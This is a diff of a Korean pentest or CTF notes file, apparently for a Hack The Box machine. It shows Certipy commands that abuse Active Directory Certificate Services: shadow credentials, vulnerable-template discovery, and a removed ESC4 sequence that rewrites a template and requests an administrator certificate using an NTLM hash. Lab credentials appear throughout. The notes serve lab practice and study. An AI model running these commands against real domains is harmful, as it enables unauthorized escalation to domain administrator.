@@ -783,30 +783,12 @@ certipy shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc
 certipy-ad find -u <user> -hashes <hashes> -dc-ip <ip> -vulnerable
 
 certipy-ad find -u <user> -p <password> -target <domain/FQDN> -text -stdout -vulnerable
-```
-<img width="1086" height="113" alt="image" src="https://github.com/user-attachments/assets/eed34f42-f4ac-4233-b3a8-1c2fa0cdb9a8" />
 
-<br>
-<br>
-
-<img width="1086" height="53" alt="image" src="https://github.com/user-attachments/assets/76523c8e-8f08-47c1-81cf-360ec9f046f4" />
-
-## ESC4
-- 초기화 되는 경우 발생.
-```bash
-# ESC4 권한을 사용하여 ESC1 취약점 생성.
-certipy-ad template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -write-default-configuration -no-save
-
-# request certificate
-certipy-ad req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -ca sequel-dc01-ca -upn administrator@sequel.htb
-
-# get hash
+# 인증 시도
 certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.51
 ```
-
-## ESC16
-- https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally
-- 두가지 방법 모두 시도.
+<img width="1086" height="113" alt="image" src="https://github.com/user-attachments/assets/eed34f42-f4ac-4233-b3a8-1c2fa0cdb9a8" />
+<img width="1086" height="53" alt="image" src="https://github.com/user-attachments/assets/76523c8e-8f08-47c1-81cf-360ec9f046f4" />
   
 </details>
 
